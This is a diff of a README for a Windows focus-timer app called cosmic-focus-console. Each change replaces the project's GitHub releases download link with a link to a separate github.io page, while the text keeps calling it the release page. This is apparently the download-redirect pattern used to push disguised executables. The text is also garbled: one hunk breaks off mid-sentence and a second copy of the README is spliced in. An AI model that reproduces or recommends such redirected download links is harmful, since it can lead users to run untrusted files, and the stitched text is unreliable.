@@ -1,6 +1,6 @@
 # 🪐 cosmic-focus-console - Focus Among the Stars, Effortlessly
 
-[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://harryunlikely3688.github.io)
 
 cosmic-focus-console is a focus timer made for people who want a calm, clear workspace on Windows. It combines a liquid-glass interface, a slowly turning 3D planet, Persian and English language support, and offline-first use. You choose a focus time, start the timer, and let the visual atmosphere help you stay on task.
 
@@ -14,7 +14,7 @@ The app supports both Persian and English. Persian mode includes right-to-left l
 
 Visit this link to download the application:
 
-[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+[Download cosmic-focus-console](https://harryunlikely3688.github.io)
 
 After the download finishes, open the downloaded item to start cosmic-focus-console on your Windows computer. The release page is the place to get the application, and the same link is repeated near the end of this page so you can find it again easily.
 
@@ -81,7 +81,7 @@ When you open cosmic-focus-console for the first time, take a moment to choose y
 
 A typical# 🪐 cosmic-focus-console - A Calm Focus Timer Among Stars
 
-[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+[![Download cosmic-focus-console](https://img.shields.io/badge/⬇️_Download_cosmic--focus--console-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://harryunlikely3688.github.io)
 
 cosmic-focus-console is a focus timer made for people who want a calm, clear workspace on Windows. It combines a liquid-glass interface, a slowly turning 3D planet, Persian and English language support, and offline-first use. You choose a focus time, start the timer, and let the visual atmosphere help you stay on task.
 
@@ -95,7 +95,7 @@ The app supports both Persian and English. Persian mode includes right-to-left l
 
 Visit this link to download the application:
 
-[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+[Download cosmic-focus-console](https://harryunlikely3688.github.io)
 
 After the download finishes, open the downloaded item to start cosmic-focus-console on your Windows computer. The release page is the place to get the application, and the same link is repeated near the end of this page so you can find it again easily.
 
@@ -206,7 +206,7 @@ You do not need to know any of this to use the app. It is background information
 
 Visit this link to download the application:
 
-[Download cosmic-focus-console](https://github.com/Harryunlikely3688/cosmic-focus-console/releases)
+[Download cosmic-focus-console](https://harryunlikely3688.github.io)
 
 Open the page, get the application, and start your first focus session on Windows. Keep the link saved so you can return to it whenever you need the app again.
 
